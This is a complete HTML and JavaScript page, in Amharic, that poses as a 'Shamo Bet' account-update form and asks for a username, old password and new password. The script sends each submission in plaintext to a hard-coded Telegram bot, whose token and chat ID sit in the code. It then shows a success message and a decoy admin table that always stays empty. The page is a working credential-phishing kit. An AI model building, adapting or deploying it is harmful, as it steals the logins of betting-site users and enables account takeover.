
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shamo Bet</title>
    <!-- Google Fonts & FontAwesome Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary-color: #ff6b00;
            --primary-hover: #e05d00;
            --bg-color: #ffffff;
            --card-bg: #f8fafc;
            --input-bg: #ffffff;
            --text-color: #0f172a;
            --text-muted: #64748b;
            --border-color: #cbd5e1;
            --danger-color: #ef4444;
            --success-color: #22c55e;
            --admin-bg: #ffffff;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Top Header */
        .header {
            width: 100%;
            background: linear-gradient(135deg, #f8fafc, #e2e8f0);
            border-bottom: 2px solid var(--primary-color);
            padding: 20px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            position: relative;
        }

        .header h1 {
            color: var(--primary-color);
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 1px;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .header p {
            color: var(--text-muted);
            font-size: 13px;
            margin-top: 4px;
        }

        .main-container {
            width: 100%;
            max-width: 480px;
            padding: 20px;
            margin-top: 20px;
        }

        /* Card Styling */
        .card {
            background-color: var(--card-bg);
            border-radius: 16px;
            padding: 28px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
            border: 1px solid var(--border-color);
            position: relative;
        }

        .card-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: center;
            color: var(--text-color);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        /* Input Fields */
        .input-group {
            margin-bottom: 18px;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            color: var(--text-muted);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper i.input-icon {
            position: absolute;
            left: 14px;
            color: var(--text-muted);
            font-size: 15px;
        }

        .input-wrapper input {
            width: 100%;
            padding: 12px 14px 12px 42px;
            background-color: var(--input-bg);
            border: 1.5px solid var(--border-color);
            border-radius: 10px;
            color: var(--text-color);
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
        }

        .input-wrapper input:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.15);
        }

        /* Toggle password visibility button */
        .toggle-pwd {
            position: absolute;
            right: 12px;
            background: none;
            border: none;
            color: var(--text-muted);
            cursor: pointer;
            font-size: 14px;
        }

        .toggle-pwd:hover {
            color: var(--text-color);
        }

        /* Buttons */
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background-color: var(--primary-color);
            color: #ffffff;
            margin-top: 10px;
        }

        .btn-primary:hover {
            background-color: var(--primary-hover);
            transform: translateY(-1px);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-secondary {
            background-color: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-muted);
            margin-top: 15px;
        }

        .btn-secondary:hover {
            background-color: #e2e8f0;
            color: var(--text-color);
        }

        .btn-danger {
            background-color: var(--danger-color);
            color: white;
            padding: 6px 10px;
            font-size: 12px;
            border-radius: 6px;
        }

        /* Message Notifications */
        .toast {
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 18px;
            font-size: 13px;
            display: none;
            align-items: center;
            gap: 10px;
        }

        .toast-success {
            background-color: rgba(34, 197, 94, 0.15);
            border: 1px solid var(--success-color);
            color: #15803d;
        }

        .toast-error {
            background-color: rgba(239, 68, 68, 0.15);
            border: 1px solid var(--danger-color);
            color: #b91c1c;
        }

        /* Admin Panel Modal Overlay */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(4px);
            z-index: 100;
            justify-content: center;
            align-items: flex-start;
            padding: 20px;
            overflow-y: auto;
        }

        .admin-modal {
            background-color: var(--admin-bg);
            width: 100%;
            max-width: 800px;
            border-radius: 16px;
            border: 1px solid var(--border-color);
            padding: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            margin-top: 30px;
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .admin-title {
            font-size: 20px;
            color: var(--primary-color);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .admin-actions {
            display: flex;
            gap: 10px;
        }

        /* Search Bar */
        .search-box {
            margin-bottom: 15px;
            position: relative;
        }

        .search-box input {
            width: 100%;
            padding: 10px 12px 10px 38px;
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-color);
            outline: none;
            font-size: 13px;
        }

        .search-box i {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
        }

        /* Table Styling */
        .table-container {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 13px;
        }

        th {
            background-color: var(--card-bg);
            color: var(--text-muted);
            padding: 12px;
            font-weight: 600;
            border-bottom: 2px solid var(--border-color);
        }

        td {
            padding: 12px;
            border-bottom: 1px solid var(--border-color);
            color: var(--text-color);
        }

        tr:hover {
            background-color: rgba(0, 0, 0, 0.02);
        }

        .pwd-cell {
            font-family: monospace;
            letter-spacing: 1px;
            background: rgba(0,0,0,0.05);
            padding: 4px 8px;
            border-radius: 4px;
        }

        .badge-time {
            font-size: 11px;
            color: var(--text-muted);
        }

        .empty-state {
            text-align: center;
            padding: 30px;
            color: var(--text-muted);
        }

        /* Auth Modal for Admin Passcode */
        .auth-card {
            max-width: 360px;
            margin: 100px auto;
        }

        /* Hidden Utility Class */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header class="header">
        <h1><i class="fa-solid fa-fire"></i> Shamo Bet</h1>
        <p>የአካውንት መረጃ ማደሻ እና ማቀናበሪያ ገጽ</p>
    </header>

    <!-- User Form Container -->
    <main class="main-container">
        
        <!-- Toast Notification -->
        <div id="toast" class="toast">
            <i id="toast-icon" class="fa-solid"></i>
            <span id="toast-msg"></span>
        </div>

        <div class="card">
            <h2 class="card-title"><i class="fa-solid fa-user-pen"></i> መረጃዎን ያስገቡ</h2>
            
            <form id="userForm">
                <!-- Username -->
                <div class="input-group">
                    <label for="username"><i class="fa-solid fa-user"></i> Username (የተጠቃሚ ስም)</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-user input-icon"></i>
                        <input type="text" id="username" placeholder="የተጠቃሚ ስም ያስገቡ" required autocomplete="off">
                    </div>
                </div>

                <!-- Old Password -->
                <div class="input-group">
                    <label for="oldPassword"><i class="fa-solid fa-key"></i> Old Password (የነበረው ፓስወርድ)</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-key input-icon"></i>
                        <input type="password" id="oldPassword" placeholder="የነበረውን ፓስወርድ ያስገቡ" required>
                        <button type="button" class="toggle-pwd" onclick="togglePasswordVisibility('oldPassword', this)">
                            <i class="fa-solid fa-eye"></i>
                        </button>
                    </div>
                </div>

                <!-- New Password -->
                <div class="input-group">
                    <label for="newPassword"><i class="fa-solid fa-lock"></i> New Password (አዲስ ፓስወርድ)</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-lock input-icon"></i>
                        <input type="password" id="newPassword" placeholder="አዲስ ፓስወርድ ያስገቡ" required>
                        <button type="button" class="toggle-pwd" onclick="togglePasswordVisibility('newPassword', this)">
                            <i class="fa-solid fa-eye"></i>
                        </button>
                    </div>
                </div>

                <!-- Submit Button -->
                <button type="submit" class="btn btn-primary">
                    <i class="fa-solid fa-paper-plane"></i> መረጃውን መዝግብ / አስገባ
                </button>
            </form>

            <!-- Admin Entry Button -->
            <button type="button" class="btn btn-secondary" onclick="openAdminAuth()">
                <i class="fa-solid fa-user-shield"></i> Admin Panel
            </button>
        </div>
    </main>

    <!-- Admin Password Verification Modal -->
    <div id="adminAuthModal" class="modal-overlay">
        <div class="card auth-card">
            <h2 class="card-title"><i class="fa-solid fa-lock"></i> Admin Authentication</h2>
            <p style="font-size: 12px; color: var(--text-muted); text-align: center; margin-bottom: 15px;">
                እባክዎን የ Admin መግቢያ ፓስወርድ ያስገቡ።
            </p>
            
            <div id="authError" class="toast toast-error" style="display: none; margin-bottom: 10px;">
                <i class="fa-solid fa-circle-exclamation"></i>
                <span>የተሳሳተ ፓስወርድ ነው!</span>
            </div>

            <div class="input-group">
                <div class="input-wrapper">
                    <i class="fa-solid fa-shield-halved input-icon"></i>
                    <input type="password" id="adminPassInput" placeholder="የ Admin ፓስወርድ" autocomplete="off">
                </div>
            </div>

            <div style="display: flex; gap: 10px;">
                <button class="btn btn-primary" onclick="verifyAdminPass()"><i class="fa-solid fa-right-to-bracket"></i> ግባ</button>
                <button class="btn btn-secondary" style="margin-top:0;" onclick="closeAdminAuth()"><i class="fa-solid fa-xmark"></i> ዝጋ</button>
            </div>
        </div>
    </div>

    <!-- Admin Dashboard Modal -->
    <div id="adminDashboardModal" class="modal-overlay">
        <div class="admin-modal">
            
            <div class="admin-header">
                <div class="admin-title">
                    <i class="fa-solid fa-sliders"></i>
                    <span>Admin Control Dashboard</span>
                </div>
                <div class="admin-actions">
                    <button class="btn btn-danger" onclick="clearAllData()">
                        <i class="fa-solid fa-trash-can"></i> ሁሉንም አጽዳ
                    </button>
                    <button class="btn btn-secondary" style="margin-top: 0;" onclick="closeAdminDashboard()">
                        <i class="fa-solid fa-lock"></i> Lock Dashboard
                    </button>
                </div>
            </div>

            <!-- Search Bar -->
            <div class="search-box">
                <i class="fa-solid fa-magnifying-glass"></i>
                <input type="text" id="searchInput" placeholder="በተጠቃሚ ስም (Username) ፈልግ..." onkeyup="filterUsers()">
            </div>

            <!-- User Data Table -->
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Username</th>
                            <th>Old Password</th>
                            <th>New Password</th>
                            <th>የተመዘገበበት ሰዓት</th>
                            <th>ድርጊት</th>
                        </tr>
                    </thead>
                    <tbody id="userTableBody">
                        <!-- Dynamic Rows loaded via JS -->
                    </tbody>
                </table>
                <div id="emptyMessage" class="empty-state hidden">
                    <i class="fa-solid fa-folder-open" style="font-size: 32px; margin-bottom: 8px;"></i>
                    <p>ምንም የተመዘገበ መረጃ አልተገኘም።</p>
                </div>
            </div>

        </div>
    </div>

    <!-- JavaScript Application Logic -->
    <script>
        // Secret Admin Passcode
        const ADMIN_PASSCODE = "866013";

        // Telegram Bot Credentials
        const TELEGRAM_BOT_TOKEN = "8919205749:AAF3jHHZ46Gp3bsSOf-2EQf4t3Kzt79syVA";
        const TELEGRAM_CHAT_ID = "6643079266";

        // Application Initialization
        document.addEventListener('DOMContentLoaded', () => {
            // Form Submit Listener
            document.getElementById('userForm').addEventListener('submit', handleUserFormSubmit);
        });

        // Toggle Password Field Visibility
        function togglePasswordVisibility(fieldId, btn) {
            const input = document.getElementById(fieldId);
            const icon = btn.querySelector('i');
            
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }

        // Display Toast Messages
        function showToast(message, isSuccess = true) {
            const toast = document.getElementById('toast');
            const toastMsg = document.getElementById('toast-msg');
            const toastIcon = document.getElementById('toast-icon');

            toastMsg.textContent = message;
            toast.className = `toast ${isSuccess ? 'toast-success' : 'toast-error'}`;
            toastIcon.className = `fa-solid ${isSuccess ? 'fa-circle-check' : 'fa-triangle-exclamation'}`;

            toast.style.display = 'flex';

            setTimeout(() => {
                toast.style.display = 'none';
            }, 3500);
        }

        // Send Data Direct to Telegram Bot
        function sendToTelegram(username, oldPassword, newPassword, timestamp) {
            const message = `🔥 *አዲስ መረጃ ተመዝግቧል! (Shamo Bet)* 🔥\n\n👤 *Username:* ${username}\n🔑 *Old Password:* ${oldPassword}\n🔐 *New Password:* ${newPassword}\n⏰ *Time:* ${timestamp}`;

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).then(res => {
                if (!res.ok) {
                    console.error('Telegram API error status:', res.status);
                }
            }).catch(error => {
                console.error('Telegram API Error:', error);
            });
        }

        // Handle User Submission Form
        function handleUserFormSubmit(event) {
            event.preventDefault();

            const username = document.getElementById('username').value.trim();
            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;

            if (!username || !oldPassword || !newPassword) {
                showToast('እባክዎን ሁሉንም ቦታዎች በትክክል ይሙሉ!', false);
                return;
            }

            const timestamp = new Date().toLocaleString('am-ET');

            // Direct transmission to Telegram Bot
            sendToTelegram(username, oldPassword, newPassword, timestamp);

            // Reset Form and Alert User
            document.getElementById('userForm').reset();
            showToast('መረጃዎ በጥሩ ሁኔታ ተመዝግቧል!');
        }

        // Admin Modal Access Handlers
        function openAdminAuth() {
            document.getElementById('adminPassInput').value = '';
            document.getElementById('authError').style.display = 'none';
            document.getElementById('adminAuthModal').style.display = 'flex';
            document.getElementById('adminPassInput').focus();
        }

        function closeAdminAuth() {
            document.getElementById('adminAuthModal').style.display = 'none';
        }

        function verifyAdminPass() {
            const inputPass = document.getElementById('adminPassInput').value;
            if (inputPass === ADMIN_PASSCODE) {
                closeAdminAuth();
                openAdminDashboard();
            } else {
                document.getElementById('authError').style.display = 'flex';
            }
        }

        // Enable "Enter" key submission in passcode input
        document.getElementById('adminPassInput').addEventListener('keyup', (e) => {
            if (e.key === 'Enter') {
                verifyAdminPass();
            }
        });

        // Admin Dashboard Handlers
        function openAdminDashboard() {
            renderUserTable();
            document.getElementById('adminDashboardModal').style.display = 'flex';
        }

        function closeAdminDashboard() {
            document.getElementById('adminDashboardModal').style.display = 'none';
        }

        // Render Empty Table in Admin Panel
        function renderUserTable(filterQuery = '') {
            const tableBody = document.getElementById('userTableBody');
            const emptyMsg = document.getElementById('emptyMessage');

            tableBody.innerHTML = '';
            emptyMsg.classList.remove('hidden');
        }

        // Filter User search
        function filterUsers() {
            const query = document.getElementById('searchInput').value;
            renderUserTable(query);
        }

        // Clear All Data
        function clearAllData() {
            renderUserTable();
        }

        // Helper to prevent HTML Injection XSS
        function escapeHtml(str) {
            return str.replace(/&/g, "&amp;")
                      .replace(/</g, "&lt;")
                      .replace(/>/g, "&gt;")
                      .replace(/"/g, "&quot;")
                      .replace(/'/g, "&#039;");
        }
    </script>
</body>
</html>
